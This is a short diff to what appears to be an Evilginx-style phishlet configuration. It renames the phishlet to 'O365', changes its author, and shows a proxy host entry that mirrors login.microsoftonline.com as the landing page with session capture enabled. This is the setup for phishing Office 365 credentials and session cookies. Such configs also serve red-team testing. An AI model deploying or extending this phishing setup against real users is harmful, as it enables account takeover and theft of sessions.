@@ -1,5 +1,5 @@
-name: 'o365whfb'
-author: 'Yehuda Smirnov'
+name: 'O365'
+author: 'Dev Brainiac'
 min_ver: '3.1.0'
 proxy_hosts:
   - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true}
